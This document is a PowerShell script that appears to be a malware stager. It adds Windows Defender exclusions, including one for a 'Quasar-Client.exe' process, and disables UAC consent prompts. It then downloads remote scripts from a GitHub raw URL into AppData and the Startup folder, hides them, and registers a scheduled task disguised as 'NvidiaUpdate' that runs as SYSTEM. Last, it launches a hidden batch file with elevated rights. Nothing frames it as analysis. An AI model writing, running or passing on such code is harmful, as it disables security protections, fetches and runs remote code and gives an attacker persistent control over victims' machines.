Add-MpPreference -ExclusionPath "$env:userprofile" -Force
Add-MpPreference -ExclusionPath "$env:appdata" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft" -Force
Add-MpPreference -ExclusionExtension ".ps1" -Force
Add-MpPreference -ExclusionExtension ".bat" -Force
Add-MpPreference -ExclusionExtension ".exe" -Force
Add-MpPreference -ExclusionExtension ".vbs" -Force
Add-MpPreference -ExclusionProcess "powershell.exe" -Force
Add-MpPreference -ExclusionProcess "cmd.exe" -Force
Add-MpPreference -ExclusionProcess "Client.exe" -Force
Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $env:appdata\Microsoft\email.ps1

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $env:appdata\Microsoft\backdrop.bat

if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
}

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\sec.vbs



attrib +h "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
attrib +h "$env:appdata\Microsoft\email.ps1"
attrib +h "$env:appdata\Microsoft\backdrop.bat"

schtasks /create /sc minute /mo 50 /tn "NvidiaUpdate" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $env:appdata\Microsoft\Windows\""Start Menu""\Programs\Startup\sec.vbs'" /f

Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"

start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
